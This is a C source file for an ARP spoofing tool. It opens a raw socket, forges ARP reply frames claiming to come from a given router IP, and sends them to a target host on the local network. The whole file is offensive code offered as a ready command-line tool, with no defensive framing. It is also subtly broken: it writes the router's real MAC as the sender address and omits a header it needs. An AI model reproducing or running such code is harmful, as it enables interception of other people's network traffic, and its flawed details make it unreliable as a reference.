#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define PACKET_LEN 42

// Function to get the MAC address of a specified interface
int get_mac_address(const char *iface, unsigned char *mac) {
    int fd;
    struct ifreq ifr;
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return -1;
    }

    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        return -1;
    }
    close(fd);

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return 0;
}

// Function to create and send an ARP reply packet
void send_arp_reply(const char *iface, const char *target_ip, const char *router_ip, const unsigned char *router_mac) {
    int sockfd;
    unsigned char packet[PACKET_LEN];
    struct sockaddr_ll sa;
    unsigned char my_mac[6];
    unsigned char target_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};  // Replace with target MAC address if known

    // Create raw socket
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket");
        exit(1);
    }

    // Get the MAC address of the interface
    if (get_mac_address(iface, my_mac) < 0) {
        fprintf(stderr, "Failed to get MAC address of interface %s\n", iface);
        close(sockfd);
        exit(1);
    }

    // Fill Ethernet frame
    memcpy(packet, target_mac, 6);       // Destination MAC
    memcpy(packet + 6, my_mac, 6);       // Source MAC
    packet[12] = 0x08;                   // ARP protocol type
    packet[13] = 0x06;

    // Fill ARP header
    packet[14] = 0x00;                   // Hardware type (Ethernet)
    packet[15] = 0x01;
    packet[16] = 0x08;                   // Protocol type (IP)
    packet[17] = 0x00;
    packet[18] = 6;                      // Hardware size
    packet[19] = 4;                      // Protocol size
    packet[20] = 0x00;                   // Opcode (ARP Reply)
    packet[21] = 0x02;
    memcpy(packet + 22, router_mac, 6);  // Sender MAC address (pretend to be router)
    
    struct in_addr router_ip_addr;
    inet_aton(router_ip, &router_ip_addr);
    memcpy(packet + 28, &router_ip_addr, 4);  // Sender IP address (router IP)

    memcpy(packet + 32, target_mac, 6);       // Target MAC address (real MAC of target device)
    
    struct in_addr target_ip_addr;
    inet_aton(target_ip, &target_ip_addr);
    memcpy(packet + 38, &target_ip_addr, 4);  // Target IP address

    // Send the packet
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = if_nametoindex(iface);
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, target_mac, 6);

    if (sendto(sockfd, packet, PACKET_LEN, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("sendto");
    } else {
        printf("Spoofed ARP reply sent to %s, claiming to be %s\n", target_ip, router_ip);
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <interface> <target_ip> <router_ip> <router_mac>\n", argv[0]);
        exit(1);
    }

    const char *iface = argv[1];
    const char *target_ip = argv[2];
    const char *router_ip = argv[3];

    unsigned char router_mac[6];
    if (sscanf(argv[4], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &router_mac[0], &router_mac[1], &router_mac[2],
               &router_mac[3], &router_mac[4], &router_mac[5]) != 6) {
        fprintf(stderr, "Invalid MAC address format\n");
        exit(1);
    }

    send_arp_reply(iface, target_ip, router_ip, router_mac);

    return 0;
}
